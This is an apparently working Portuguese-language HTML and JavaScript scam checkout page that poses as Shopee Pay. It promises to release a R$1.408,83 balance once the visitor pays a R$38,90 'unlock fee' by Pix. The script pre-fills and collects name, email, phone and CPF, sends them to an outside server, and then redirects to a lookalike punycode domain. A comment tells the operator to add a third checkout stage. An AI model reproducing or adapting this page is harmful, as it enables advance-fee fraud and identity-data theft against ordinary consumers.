<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif; }
    
    /* ESTILO DA P√ÅGINA */
    .iof-container {
        max-width: 450px;
        margin: 0 auto;
        padding: 25px 20px;
        background: #fff;
        border-left: 8px solid #f05a28; /* Borda laranja lateral */
        border-right: 8px solid #f05a28;
    }
    .iof-title { font-size: 20px; color: #333; margin-bottom: 10px; font-weight: 700; }
    .iof-desc { font-size: 13px; color: #666; margin-bottom: 20px; line-height: 1.4; }
    
    /* BARRA DE PROGRESSO */
    .progress-section { display: flex; justify-content: space-between; font-size: 11px; font-weight: 700; margin-bottom: 5px; }
    .text-green { color: #28a745; }
    .text-orange { color: #f05a28; }
    .progress-bar-container { display: flex; height: 6px; background: #eee; border-radius: 4px; margin-bottom: 25px; overflow: hidden; }
    .progress-bar-fill { width: 50%; background: #f05a28; }
    
    /* FORMUL√ÅRIO (AGORA EDIT√ÅVEL) */
    .form-group { margin-bottom: 15px; text-align: left; }
    .form-group label { display: block; font-size: 12px; color: #333; font-weight: 700; margin-bottom: 5px; }
    .form-group input { 
        width: 100%; 
        padding: 12px; 
        border: 1px solid #ddd; 
        border-radius: 4px; 
        font-size: 14px; 
        color: #333; 
        background: #fff; 
        outline: none; 
        transition: 0.3s;
    }
    .form-group input:focus {
        border-color: #f05a28;
        box-shadow: 0 0 5px rgba(240, 90, 40, 0.2);
    }
    
    /* CAIXA DE RESUMO */
    .summary-box { border: 1px dashed #ccc; border-radius: 8px; padding: 15px; margin-bottom: 20px; background: #fafafa; }
    .summary-title { text-align: right; font-size: 13px; font-weight: 700; margin-bottom: 10px; }
    .summary-row { display: flex; justify-content: space-between; font-size: 13px; margin-bottom: 15px; align-items: center; }
    .summary-calc { color: #28a745; font-weight: 700; font-size: 12px; text-align: right; line-height: 1.4; }
    .summary-total { display: flex; justify-content: space-between; border-top: 1px dashed #ccc; padding-top: 15px; font-size: 14px; color: #666; align-items: center; }
    .total-price { font-size: 18px; font-weight: 700; color: #333; }
    
    /* BOT√ÉO FINALIZAR */
    .btn-finalizar { background: #f05a28; color: white; border: none; width: 100%; padding: 18px; font-size: 16px; font-weight: 700; border-radius: 6px; cursor: pointer; text-transform: uppercase; margin-bottom: 15px; transition: background 0.3s; }
    .btn-finalizar:active { background: #d1491f; }
    .btn-finalizar:disabled { background: #ccc; cursor: wait; }
    .safe-env { text-align: center; font-size: 11px; color: #888; }
    .safe-env img { width: 10px; margin-right: 5px; }

    /* MODAL DO PIX */
    .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 9998; }
    .modal-pix { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 40px rgba(0,0,0,0.3); z-index: 9999; text-align: center; width: 90%; max-width: 380px; }
    .modal-pix h3 { color: #28a745; margin-bottom: 5px; font-size: 18px; }
    .modal-pix p { color: #666; font-size: 13px; margin-bottom: 15px; }
    #qr_code_div img { width: 200px; height: 200px; margin: 0 auto 15px auto; border-radius: 8px; border: 1px solid #eee; padding: 5px; }
    .input-copia { width: 100%; padding: 12px; background: #f4f5f7; border: 1px solid #ddd; border-radius: 6px; font-size: 12px; color: #555; margin-bottom: 15px; outline: none; text-align: center;}
    .btn-copiar { background: #28a745; color: white; border: none; padding: 15px; width: 100%; border-radius: 30px; font-weight: 700; cursor: pointer; transition: 0.3s;}
</style>
</head>
<body>

<div class="iof-container">
    <h2 class="iof-title">Confirma√ß√£o final do pedido</h2>
    <p class="iof-desc">Seus dados foram verificados com sucesso. Para concluir a solicita√ß√£o, confirme seus dados e finalize o pagamento abaixo.</p>

    <div class="progress-section">
        <span>VERIFICA√á√ÉO DE DADOS</span>
        <span class="text-green">CONCLU√çDO</span>
    </div>
    <div class="progress-bar-container">
        <div class="progress-bar-fill"></div>
    </div>
    <div class="progress-section">
        <span>ANTECIPA√á√ÉO DE SAQUE</span>
        <span class="text-orange">PENDENTE</span>
    </div>

    <div class="form-group">
        <label>Nome Completo</label>
        <input type="text" id="iof_nome" placeholder="Digite seu nome completo">
    </div>
    <div class="form-group">
        <label>E-mail</label>
        <input type="email" id="iof_email" placeholder="seuemail@email.com">
    </div>
    <div class="form-group">
        <label>Celular</label>
        <input type="text" id="iof_phone" placeholder="(00) 00000-0000" maxlength="15">
    </div>
    <div class="form-group">
        <label>CPF</label>
        <input type="text" id="iof_cpf" placeholder="000.000.000-00" maxlength="14">
    </div>

    <div class="summary-box">
        <div class="summary-title">Taxa de Desbloqueio</div>
        <div class="summary-row">
            <span style="color: #666;">Saldo a<br>liberar:</span>
            <span class="summary-calc">R$ 1.342,03 + 27,90 + 38,90 = R$<br>1.408,83</span>
        </div>
        <div class="summary-total">
            <span>Total a pagar</span>
            <span class="total-price">R$ 38,90</span>
        </div>
    </div>

    <button id="btn_pagar" class="btn-finalizar" onclick="gerarPixIOF()">FINALIZAR PAGAMENTO</button>
    
    <div class="safe-env">
        üîí Ambiente 100% seguro | Shopee Pay
    </div>
</div>

<div class="overlay" id="overlay"></div>
<div class="modal-pix" id="modal_pix">
    <h3>‚úÖ QR CODE GERADO</h3>
    <p>Finalize o pagamento para liberar seu saque.</p>
    
    <div id="qr_code_div">
        <img id="img_qr" src="" alt="Gerando QR Code...">
    </div>
    
    <input type="text" id="txt_codigo" class="input-copia" readonly value="Aguarde...">
    
    <button class="btn-copiar" id="btn_copy" onclick="copiarCodigo()">COPIAR C√ìDIGO PIX</button>
    <p id="status_msg" style="font-size: 12px; color: #888; margin-top: 15px;">Aguardando confirma√ß√£o do banco...</p>
</div>

<script>
    // ==========================================================
    // CONFIGURA√á√ïES DO SERVIDOR
    // ==========================================================
    const API_URL = "https://checkoutfinal.onrender.com"; 
    
    // üî¥ MUITO IMPORTANTE: COLOQUE AQUI O LINK DO SEU TERCEIRO CHECKOUT!
    const PROXIMA_ETAPA = "https://xn--seubnushopp-5eb.com/pagina-3/"; 

    // ==========================================================
    // AUTO-PREENCHIMENTO E M√ÅSCARAS
    // ==========================================================
    window.onload = function() {
        const local = JSON.parse(localStorage.getItem('dadosUsuario') || '{}');
        const params = new URLSearchParams(window.location.search);

        // Puxa da URL primeiro. Se n√£o tiver, tenta a Mem√≥ria. Se n√£o tiver, deixa em branco pro cliente.
        document.getElementById("iof_nome").value = params.get('nome') || local.nome || "";
        document.getElementById("iof_email").value = params.get('email') || local.email || "";
        document.getElementById("iof_cpf").value = params.get('cpf') || local.cpf || local.documento || "";
        document.getElementById("iof_phone").value = params.get('phone') || params.get('celular') || local.telefone || local.celular || "";
    };

    // M√°scaras para formatar caso o cliente resolva apagar e digitar de novo
    document.getElementById('iof_cpf').addEventListener('input', function(e){
        let v = e.target.value.replace(/\D/g,'');
        v = v.replace(/(\d{3})(\d)/,'$1.$2');
        v = v.replace(/(\d{3})(\d)/,'$1.$2');
        v = v.replace(/(\d{3})(\d{1,2})$/,'$1-$2');
        e.target.value = v;
    });

    document.getElementById('iof_phone').addEventListener('input', function(e){
        let v = e.target.value.replace(/\D/g,'');
        v = v.replace(/^(\d{2})(\d)/g,'($1) $2');
        v = v.replace(/(\d{5})(\d{4})$/,'$1-$2');
        e.target.value = v;
    });

    // ==========================================================
    // GERA√á√ÉO DO PIX
    // ==========================================================
    function gerarPixIOF() {
        const btn = document.getElementById("btn_pagar");
        
        // Valida√ß√£o r√°pida para ver se o cliente n√£o apagou tudo sem querer
        if(!document.getElementById("iof_nome").value || !document.getElementById("iof_cpf").value) {
            alert("Por favor, preencha os dados corretamente.");
            return;
        }

        btn.innerHTML = "PROCESSANDO...";
        btn.disabled = true;

        // VALOR EXATO DA TAXA IOF: 38,90
        const payload = {
            name: document.getElementById("iof_nome").value,
            email: document.getElementById("iof_email").value,
            phone: document.getElementById("iof_phone").value.replace(/\D/g, ''),
            cpf: document.getElementById("iof_cpf").value.replace(/\D/g, ''),
            valor: "38.90" 
        };
        
        // Salva os dados mais recentes na mem√≥ria para a pr√≥xima p√°gina usar tamb√©m
        localStorage.setItem('dadosUsuario', JSON.stringify({
            nome: payload.name, email: payload.email, cpf: payload.cpf, telefone: payload.phone
        }));

        fetch(`${API_URL}/pix`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        })
        .then(res => res.json())
        .then(data => {
            if (data.success) {
                // ABRE A TELA ESCURA E O MODAL
                document.getElementById("overlay").style.display = "block";
                document.getElementById("modal_pix").style.display = "block";
                
                // PREENCHE QR CODE E C√ìDIGO 
                document.getElementById("txt_codigo").value = data.payload;
                document.getElementById("img_qr").src = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(data.payload)}`;

                // ==========================================================
                // MONITORAMENTO (REDIRECIONAMENTO AUTOM√ÅTICO - POLLING)
                // ==========================================================
                const monitoramento = setInterval(() => {
                    fetch(`${API_URL}/check-status/${data.transactionId}`)
                    .then(r => r.json())
                    .then(resStatus => {
                        if(resStatus.paid === true) {
                            clearInterval(monitoramento); // Para o cron√¥metro
                            
                            // Avisa na tela que deu certo!
                            document.getElementById('status_msg').innerText = "üöÄ Pagamento aprovado! Preparando pr√≥xima etapa...";
                            document.getElementById('status_msg').style.color = "#28a745";
                            document.getElementById('status_msg').style.fontWeight = "bold";
                            
                            // Pula para a pr√≥xima p√°gina (Checkout Final)
                            setTimeout(() => {
                                window.location.href = PROXIMA_ETAPA;
                            }, 1500);
                        }
                    })
                    .catch(err => console.log("Aguardando banco..."));
                }, 3000); // Consulta a cada 3 segundos

            } else {
                alert("Erro ao conectar com banco. Tente novamente.");
                btn.innerHTML = "FINALIZAR PAGAMENTO";
                btn.disabled = false;
            }
        })
        .catch(err => {
            alert("Erro de conex√£o com a internet.");
            btn.innerHTML = "FINALIZAR PAGAMENTO";
            btn.disabled = false;
        });
    }

    // ==========================================================
    // FUN√á√ÉO COPIAR MELHORADA
    // ==========================================================
    function copiarCodigo() {
        const copyText = document.getElementById("txt_codigo");
        copyText.select();
        copyText.setSelectionRange(0, 99999);
        navigator.clipboard.writeText(copyText.value);
        
        const btnCopy = document.getElementById('btn_copy');
        btnCopy.innerText = "‚úÖ C√ìDIGO COPIADO!";
        btnCopy.style.background = "#1e7e34"; // Fica um verde mais escuro confirmando
        
        setTimeout(() => {
            btnCopy.innerText = "COPIAR C√ìDIGO PIX";
            btnCopy.style.background = "#28a745"; // Volta pro original
        }, 3000);
    }
</script>

</body>
</html>
